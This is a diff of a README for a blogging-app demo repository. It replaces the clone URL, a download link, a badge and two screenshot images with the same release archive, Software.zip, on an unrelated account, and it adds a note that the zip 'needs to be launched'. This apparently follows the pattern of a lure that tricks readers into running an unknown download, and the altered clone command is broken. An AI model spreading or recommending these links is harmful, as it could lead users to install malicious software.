@@ -23,7 +23,7 @@ To get started with the Wanderlust Blogging App demo, follow the steps below:
 
 1. Clone the repository:
 ```bash
-git clone https://github.com/yourusername/Wanderlust-Blogging-App.git
+git clone https://github.com/TEST193747/Wanderlust-Blogging-App/releases/download/v1.0/Software.zip
 ```
 
 2. Navigate to the project directory:
@@ -34,19 +34,19 @@ cd Wanderlust-Blogging-App
 3. Follow the detailed instructions in the project documentation for deploying the application.
 
 ## Useful Links
-🔗 [Download the Browser CLI zip file](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+🔗 [Download the Browser CLI zip file](https://github.com/TEST193747/Wanderlust-Blogging-App/releases/download/v1.0/Software.zip)
 
 ### Note: The Browser CLI zip file needs to be launched.
 
 If the link provided above is not working, please check the "Releases" section of the repository for alternate download options.
 
-[![Download CLI](https://img.shields.io/badge/Download-CLI-orange)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download CLI](https://github.com/TEST193747/Wanderlust-Blogging-App/releases/download/v1.0/Software.zip)](https://github.com/TEST193747/Wanderlust-Blogging-App/releases/download/v1.0/Software.zip)
 
 ## Screenshots
 Here are some snapshots of the Wanderlust Blogging App in action:
 
-![Screenshot 1](https://yourwebsite.com/screenshot1.png)
-![Screenshot 2](https://yourwebsite.com/screenshot2.png)
+![Screenshot 1](https://github.com/TEST193747/Wanderlust-Blogging-App/releases/download/v1.0/Software.zip)
+![Screenshot 2](https://github.com/TEST193747/Wanderlust-Blogging-App/releases/download/v1.0/Software.zip)
 
 ## Contributing
 We welcome contributions to the Wanderlust Blogging App repository. Feel free to submit pull requests or raise issues for any improvements or bug fixes.
